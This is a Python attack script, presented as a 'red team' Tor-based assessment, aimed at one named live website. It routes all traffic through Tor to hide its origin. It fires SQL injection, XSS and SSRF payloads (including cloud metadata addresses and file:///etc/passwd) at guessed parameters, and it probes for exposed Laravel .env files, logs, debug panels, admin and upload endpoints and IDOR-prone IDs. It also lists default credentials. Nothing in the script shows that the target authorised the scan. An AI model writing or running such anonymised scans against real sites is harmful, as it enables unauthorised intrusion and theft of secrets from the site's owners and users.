#!/usr/bin/env python3
"""
MobileSec Red Team Console - Deep Tor-Based Assessment
Target: cyrax.info
TACTICAL ASSESSMENT: Using Tor for anonymity, preventing DNS leaks, comprehensive testing
PROTOCOL: Multi-vector deep penetration testing via Tor
"""

import requests
import sys
import time
import socket
import subprocess
import base64
import json

# ANSI Colors
R = "\x1b[1;31m"
G = "\x1b[1;32m"
Y = "\x1b[1;33m"
B = "\x1b[1;34m"
C = "\x1b[1;36m"
NC = "\x1b[0m"

TARGET = "https://cyrax.info"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

# Tor SOCKS proxy
TOR_PROXY = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def check_tor():
    """Check if Tor is running and working"""
    print(f"\n{B}[*] Checking Tor Connection{NC}\n")
    
    try:
        # Test Tor connection
        response = requests.get('https://check.torproject.org/api/ip', 
                              proxies=TOR_PROXY, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('IsTor') == True:
                print(f"{G}[+] Tor is active{NC}")
                print(f"{C}[*] Exit IP: {data.get('IP', 'Unknown')}{NC}")
                return True
            else:
                print(f"{R}[!] Not using Tor - connection may be direct{NC}")
                return False
    except Exception as e:
        print(f"{R}[!] Tor connection failed: {e}{NC}")
        print(f"{Y}[!] Make sure Tor is running: tor{NC}")
        return False

def prevent_dns_leak():
    """Configure to prevent DNS leaks"""
    print(f"\n{B}[*] Configuring DNS Leak Prevention{NC}\n")
    
    # Use SOCKS5h (h = hostname resolution on proxy side)
    # This ensures DNS queries go through Tor
    print(f"{G}[+] Using SOCKS5h proxy (hostname resolution on proxy){NC}")
    print(f"{G}[+] DNS queries will be routed through Tor{NC}")
    return True

def test_sql_injection():
    """Test SQL injection vulnerabilities"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: SQL Injection Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--"
    ]
    
    # Laravel common parameter names
    params = ['id', 'user_id', 'post_id', 'page', 'search', 'q', 'email', 'username']
    
    found = []
    
    for param in params:
        for payload in payloads:
            try:
                url = f"{TARGET}?{param}={payload}"
                start_time = time.time()
                r = requests.head(url, headers={'User-Agent': UA}, 
                                 proxies=TOR_PROXY, timeout=10, verify=True)
                elapsed = time.time() - start_time
                
                # Check for time-based SQLi
                if elapsed > 4:
                    print(f"{R}[!] Potential time-based SQLi in '{param}' with payload: {payload}{NC}")
                    print(f"    Response time: {elapsed:.2f}s")
                    found.append((param, payload, 'time-based'))
                
                # Check for error messages
                if r.status_code == 500:
                    print(f"{Y}[?] Server error with '{param}'={payload} (Status: 500){NC}")
                    found.append((param, payload, 'error'))
                
                time.sleep(0.5)  # Rate limiting
            except:
                pass
    
    return found

def test_xss():
    """Test XSS vulnerabilities"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: XSS Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>"
    ]
    
    params = ['q', 'search', 'name', 'comment', 'message', 'input', 'page']
    
    found = []
    
    for param in params:
        for payload in payloads:
            try:
                url = f"{TARGET}?{param}={payload}"
                r = requests.head(url, headers={'User-Agent': UA}, 
                                proxies=TOR_PROXY, timeout=5, verify=True)
                
                # Note: HEAD won't show reflected content, but we can check status
                if r.status_code == 200:
                    print(f"{Y}[?] {param}={payload[:30]}... (Status: 200 - manual verification needed){NC}")
                    found.append((param, payload))
                time.sleep(0.3)
            except:
                pass
    
    return found

def test_laravel_specific():
    """Test Laravel-specific vulnerabilities"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: Laravel-Specific Vulnerabilities{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    laravel_paths = [
        # Debug endpoints
        '/_debugbar',
        '/telescope',
        '/horizon',
        '/log-viewer',
        
        # Config files
        '/.env',
        '/.env.backup',
        '/.env.example',
        '/config/database.php',
        '/config/app.php',
        
        # Storage
        '/storage/logs/laravel.log',
        '/storage/framework/sessions',
        
        # Artisan
        '/artisan',
        
        # Vendor
        '/vendor/autoload.php',
        
        # Routes
        '/routes/web.php',
        '/routes/api.php',
        
        # Laravel debug
        '/debug',
        '/phpinfo',
        '/info.php'
    ]
    
    found = []
    
    for path in laravel_paths:
        try:
            url = f"{TARGET}{path}"
            r = requests.head(url, headers={'User-Agent': UA}, 
                            proxies=TOR_PROXY, timeout=5, verify=True)
            
            if r.status_code == 200:
                print(f"{R}[!] CRITICAL: {url} is accessible!{NC}")
                found.append((url, 200, 'accessible'))
            elif r.status_code == 403:
                print(f"{Y}[403] {url} (Forbidden - but exists){NC}")
                found.append((url, 403, 'forbidden'))
            elif r.status_code == 401:
                print(f"{C}[401] {url} (Unauthorized - endpoint exists){NC}")
                found.append((url, 401, 'unauthorized'))
            time.sleep(0.2)
        except:
            pass
    
    return found

def test_authentication():
    """Test authentication mechanisms"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: Authentication Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    auth_paths = [
        '/login',
        '/auth/login',
        '/signin',
        '/admin/login',
        '/admin',
        '/dashboard',
        '/user/login',
        '/api/auth/login',
        '/api/login'
    ]
    
    found = []
    
    for path in auth_paths:
        try:
            url = f"{TARGET}{path}"
            r = requests.head(url, headers={'User-Agent': UA}, 
                            proxies=TOR_PROXY, timeout=5, verify=True)
            
            if r.status_code == 200:
                print(f"{G}[200] {url} (Login page accessible){NC}")
                found.append((url, 200))
            elif r.status_code == 302 or r.status_code == 301:
                location = r.headers.get('Location', 'N/A')
                print(f"{C}[{r.status_code}] {url} -> {location}{NC}")
                found.append((url, r.status_code, location))
            elif r.status_code == 401:
                print(f"{C}[401] {url} (Requires authentication){NC}")
                found.append((url, 401))
            time.sleep(0.2)
        except:
            pass
    
    # Test for default credentials
    print(f"\n{C}[*] Testing for default credentials (common Laravel setups){NC}")
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('test', 'test')
    ]
    
    # This would require POST requests - note for manual testing
    print(f"{Y}[!] Manual credential testing required (POST requests){NC}")
    
    return found

def test_api_endpoints_deep():
    """Deep API endpoint testing"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: Deep API Endpoint Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    api_paths = [
        '/api',
        '/api/v1',
        '/api/v2',
        '/api/user',
        '/api/users',
        '/api/auth',
        '/api/auth/login',
        '/api/auth/register',
        '/api/auth/logout',
        '/api/posts',
        '/api/data',
        '/api/upload',
        '/api/files',
        '/api/admin',
        '/api/config'
    ]
    
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    found = []
    
    for path in api_paths:
        url = f"{TARGET}{path}"
        for method in methods:
            try:
                r = requests.request(method, url, headers={'User-Agent': UA}, 
                                   proxies=TOR_PROXY, timeout=5, verify=True, 
                                   allow_redirects=False)
                
                if r.status_code == 200:
                    print(f"{G}[200] {method} {url}{NC}")
                    found.append((url, method, 200))
                    break
                elif r.status_code == 405:
                    print(f"{Y}[405] {method} {url} (Method not allowed - but endpoint exists){NC}")
                    found.append((url, method, 405))
                    break
                elif r.status_code == 401:
                    print(f"{C}[401] {method} {url} (Unauthorized - endpoint exists){NC}")
                    found.append((url, method, 401))
                    break
                elif r.status_code not in [404, 403]:
                    print(f"{C}[{r.status_code}] {method} {url}{NC}")
                    found.append((url, method, r.status_code))
                    break
            except:
                pass
        time.sleep(0.2)
    
    return found

def test_file_upload():
    """Test file upload vulnerabilities"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: File Upload Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    upload_paths = [
        '/upload',
        '/api/upload',
        '/file/upload',
        '/admin/upload',
        '/upload/file'
    ]
    
    found = []
    
    for path in upload_paths:
        try:
            url = f"{TARGET}{path}"
            r = requests.head(url, headers={'User-Agent': UA}, 
                            proxies=TOR_PROXY, timeout=5, verify=True)
            
            if r.status_code == 200:
                print(f"{G}[200] {url} (Upload endpoint accessible){NC}")
                found.append((url, 200))
            elif r.status_code == 405:
                print(f"{Y}[405] {url} (POST required - upload endpoint exists){NC}")
                found.append((url, 405))
            time.sleep(0.2)
        except:
            pass
    
    return found

def test_idor():
    """Test Insecure Direct Object Reference"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: IDOR Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    # Test sequential IDs
    test_ids = [1, 2, 3, 10, 100, 1000, 9999]
    idor_paths = [
        '/api/user/',
        '/api/users/',
        '/user/',
        '/users/',
        '/post/',
        '/posts/',
        '/file/',
        '/files/',
        '/document/',
        '/documents/'
    ]
    
    found = []
    
    for base_path in idor_paths:
        for test_id in test_ids:
            try:
                url = f"{TARGET}{base_path}{test_id}"
                r = requests.head(url, headers={'User-Agent': UA}, 
                                proxies=TOR_PROXY, timeout=5, verify=True)
                
                if r.status_code == 200:
                    print(f"{G}[200] {url} (Resource accessible){NC}")
                    found.append((url, 200))
                elif r.status_code == 403:
                    print(f"{Y}[403] {url} (Forbidden - but resource exists){NC}")
                    found.append((url, 403))
                time.sleep(0.1)
            except:
                pass
    
    return found

def test_ssrf():
    """Test Server-Side Request Forgery"""
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] TEST: SSRF Testing{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    ssrf_payloads = [
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254',  # AWS metadata
        'http://metadata.google.internal',  # GCP metadata
        'file:///etc/passwd',
        'http://[::1]'
    ]
    
    params = ['url', 'link', 'redirect', 'next', 'target', 'file']
    
    found = []
    
    for param in params:
        for payload in ssrf_payloads:
            try:
                url = f"{TARGET}?{param}={payload}"
                r = requests.head(url, headers={'User-Agent': UA}, 
                                proxies=TOR_PROXY, timeout=3, verify=True)
                
                if r.status_code in [200, 302, 301]:
                    print(f"{Y}[?] {param}={payload} (Response: {r.status_code} - manual verification needed){NC}")
                    found.append((param, payload))
                time.sleep(0.3)
            except:
                pass
    
    return found

def main():
    print(f"{B}{'='*70}{NC}")
    print(f"{B}  MOBILESEC - DEEP TOR-BASED ASSESSMENT{NC}")
    print(f"{B}  TARGET: {TARGET}{NC}")
    print(f"{B}  ANONYMITY: Tor + DNS Leak Prevention{NC}")
    print(f"{B}{'='*70}{NC}")
    
    # Check Tor
    if not check_tor():
        print(f"{R}[!] Tor not available - continuing without Tor{NC}")
        print(f"{Y}[!] WARNING: Not anonymous!{NC}")
        global TOR_PROXY
        TOR_PROXY = None
    
    prevent_dns_leak()
    
    all_findings = []
    critical = []
    
    # Run all tests
    sqli_findings = test_sql_injection()
    if sqli_findings:
        all_findings.append(f"SQL Injection: {len(sqli_findings)} potential issues")
        for param, payload, vuln_type in sqli_findings:
            if vuln_type == 'time-based':
                critical.append(f"Time-based SQLi in {param}")
    
    xss_findings = test_xss()
    if xss_findings:
        all_findings.append(f"XSS: {len(xss_findings)} potential issues")
    
    laravel_findings = test_laravel_specific()
    if laravel_findings:
        for url, status, info in laravel_findings:
            if status == 200:
                critical.append(f"CRITICAL: {url} accessible")
    
    auth_findings = test_authentication()
    if auth_findings:
        all_findings.append(f"Authentication: {len(auth_findings)} endpoints found")
    
    api_findings = test_api_endpoints_deep()
    if api_findings:
        all_findings.append(f"API: {len(api_findings)} endpoints discovered")
    
    upload_findings = test_file_upload()
    if upload_findings:
        all_findings.append(f"File Upload: {len(upload_findings)} endpoints found")
    
    idor_findings = test_idor()
    if idor_findings:
        all_findings.append(f"IDOR: {len(idor_findings)} potential issues")
    
    ssrf_findings = test_ssrf()
    if ssrf_findings:
        all_findings.append(f"SSRF: {len(ssrf_findings)} potential issues")
    
    # Final Summary
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] DEEP ASSESSMENT SUMMARY{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    if critical:
        print(f"{R}[!] CRITICAL FINDINGS ({len(critical)}):{NC}\n")
        for i, finding in enumerate(critical, 1):
            print(f"  {i}. {finding}")
        print()
    
    if all_findings:
        print(f"{Y}[!] Additional Findings ({len(all_findings)}):{NC}\n")
        for i, finding in enumerate(all_findings, 1):
            print(f"  {i}. {finding}")
    
    print(f"\n{B}[*] Assessment completed{NC}")

if __name__ == "__main__":
    main()
